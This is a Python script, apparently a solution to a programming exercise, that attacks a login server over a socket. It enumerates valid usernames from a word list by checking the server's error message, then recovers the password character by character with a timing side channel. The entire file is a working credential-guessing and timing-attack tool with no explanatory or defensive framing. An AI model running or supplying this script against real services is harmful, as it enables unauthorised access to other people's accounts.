import itertools
import string
import socket
import sys
import json
from datetime import datetime
from time import time

args = sys.argv
ip = str(args[1])
port = int(args[2])

with open("logins.txt", 'r') as file:
    logins = file.readlines()

my_socket = socket.socket()
address = (ip, port)
try:
    my_socket.connect(address)
except ConnectionResetError:
    print("Cannot connect")


def login(*args):
    from time import time
    try:
        for msg in args:
            login = {"login": msg.strip("\n"), "password": ''}
            login_json = json.dumps(login)
            login_encoded = login_json.encode()
            start = time()
            my_socket.send(login_encoded)
            response = my_socket.recv(1024)
            end = time()
            total = end - start
            response_decoded = response.decode()
            response_dict = json.loads(response_decoded)["result"]
            if response_dict == "Wrong password!":
                return login["login"]
    except ConnectionResetError:
        my_socket.close()


id = login(*logins)

option = string.ascii_lowercase + string.digits + string.ascii_uppercase


def password(login, *args):
    from time import time
    password = ""
    try:
        while True:
            for char in args:
                login_attempt = {"login": login, "password": password + char}
                login_json = json.dumps(login_attempt)
                login_encoded = login_json.encode()
                start = datetime.now()
                my_socket.send(login_encoded)
                response = my_socket.recv(1024)
                end = datetime.now()
                total = end - start
                response_decoded = response.decode()
                response_dict = json.loads(response_decoded)["result"]
                if (total).microseconds >= 90000:
                    password += char
                elif response_dict == "Connection success!":
                    print(json.dumps({"login": login, "password": password + char}))
                    sys.exit(0)
    except ConnectionResetError:
        my_socket.close()

password(id, *option)
my_socket.close()
